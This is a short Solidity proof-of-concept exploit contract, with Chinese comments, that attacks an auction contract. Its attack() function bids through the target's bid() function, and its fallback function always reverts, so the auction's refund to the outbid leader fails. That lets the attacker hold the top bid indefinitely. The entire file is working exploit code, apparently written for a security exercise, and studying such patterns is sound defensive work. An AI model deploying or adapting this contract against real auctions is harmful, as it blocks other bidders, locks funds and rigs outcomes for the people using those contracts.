pragma solidity ^0.4.22;
import "hardhat/console.sol";
//设置原合约接口，方便调用函数
interface Auction{
    function bid() external payable;
}

contract POC {
    address owner;
    Auction auInstance;
    
    function POC() public payable{
        owner = msg.sender;
        
        console.log(owner);
    }
    
    modifier onlyOwner() {
        require(owner==msg.sender);
        _;
    }

    //指向原合约地址
    function setInstance(address addr) public onlyOwner {
        auInstance = Auction(addr);
    }
    
    function attack() public payable onlyOwner {
        auInstance.bid.value(msg.value)();
    }   
    function() external{
        console.log("--1---");
        revert("6666");
        console.log("--1---");
    }
}